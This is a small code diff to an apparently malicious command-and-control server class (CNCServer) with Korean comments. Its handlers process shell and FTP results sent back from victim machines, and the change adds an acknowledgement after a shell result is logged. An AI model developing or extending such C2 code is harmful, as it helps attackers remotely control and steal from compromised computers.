@@ -300,6 +300,7 @@ class CNCServer(BaseHTTPRequestHandler):
     # shell 응답에 대한 처리 함수
     def _func_shell_response(self, victim_ip : str, ddp_data):
         Logger.info('sh result : {}'.format(ddp_data.decode(ENCODING)))
+        self._response_ack()
 
     # ftp 응답에 대한 처리 함수
     def _func_ftp_response(self, victim_ip : str, ddp_data):
